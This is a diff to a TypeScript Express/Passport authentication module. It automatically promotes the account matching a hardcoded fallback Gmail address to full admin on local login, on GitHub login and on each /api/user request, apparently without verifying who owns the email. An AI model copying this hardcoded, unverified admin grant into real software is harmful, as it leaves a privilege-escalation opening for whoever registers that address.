@@ -27,6 +27,8 @@ declare global {
 }
 
 const scryptAsync = promisify(scrypt);
+const primaryAdminEmail =
+  process.env.PRIMARY_ADMIN_EMAIL || "5epmgllc@gmail.com";
 
 async function hashPassword(password: string) {
   const salt = randomBytes(16).toString("hex");
@@ -39,6 +41,31 @@ async function comparePasswords(supplied: string, stored: string) {
   const hashedBuf = Buffer.from(hashed, "hex");
   const suppliedBuf = (await scryptAsync(supplied, salt, 64)) as Buffer;
   return timingSafeEqual(hashedBuf, suppliedBuf);
+}
+
+function normalizeEmail(email?: string | null) {
+  return (email || "").trim().toLowerCase();
+}
+
+async function ensurePrimaryAdmin(user?: schema.User | null) {
+  if (!user) {
+    return user;
+  }
+
+  const userEmail = normalizeEmail(user.email);
+  if (!userEmail || userEmail !== normalizeEmail(primaryAdminEmail)) {
+    return user;
+  }
+
+  if (user.isAdmin && user.adminApproved && user.role === "admin") {
+    return user;
+  }
+
+  return storage.updateUser(user.id, {
+    isAdmin: true,
+    adminApproved: true,
+    role: "admin",
+  });
 }
 
 // Create Express app
@@ -78,7 +105,8 @@ passport.use(
     if (!user || !(await comparePasswords(password, user.password))) {
       return done(null, false);
     } else {
-      return done(null, user);
+      const ensuredUser = await ensurePrimaryAdmin(user);
+      return done(null, ensuredUser || user);
     }
   }),
 );
@@ -121,8 +149,9 @@ if (process.env.GITHUB_CLIENT_ID && process.env.GITHUB_CLIENT_SECRET) {
               created_at: new Date(),
             });
           }
-          
-          return done(null, user);
+
+          const ensuredUser = await ensurePrimaryAdmin(user);
+          return done(null, ensuredUser || user);
         } catch (err) {
           return done(err as Error);
         }
@@ -188,7 +217,16 @@ app.post("/api/logout", (req, res, next) => {
 
 app.get("/api/user", (req, res) => {
   if (!req.isAuthenticated()) return res.status(401).json({ message: "Not authenticated" });
-  res.json(req.user);
+  ensurePrimaryAdmin(req.user as schema.User)
+    .then((ensuredUser) => {
+      if (ensuredUser) {
+        req.user = ensuredUser;
+      }
+      res.json(req.user);
+    })
+    .catch(() => {
+      res.json(req.user);
+    });
 });
 
 // GitHub auth routes
